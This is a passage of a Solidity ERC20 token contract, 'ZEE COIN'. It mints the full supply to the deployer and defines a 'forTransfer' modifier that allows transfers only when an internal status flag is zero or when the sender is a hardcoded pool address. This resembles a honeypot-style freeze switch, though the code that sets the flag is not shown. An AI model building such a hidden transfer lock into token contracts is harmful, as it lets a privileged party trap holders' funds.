...
contract ZEECOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenZEE_totalSupply;
    uint256 private _tokenZEE_status = 0;
    uint256 public stakingPoolZEEStatus = 0;

    string private _tokenZEE_name;
    string private _tokenZEE_symbol;

    address private _poolZEEAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenZEE_name = "ZEE COIN";
        _tokenZEE_symbol = "ZEE";
        _tokenZEE_totalSupply = 47200 * 10 ** 18;
        _balances[msg.sender] = _tokenZEE_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolZEEAddress || _tokenZEE_status == 0);
        _;
    }
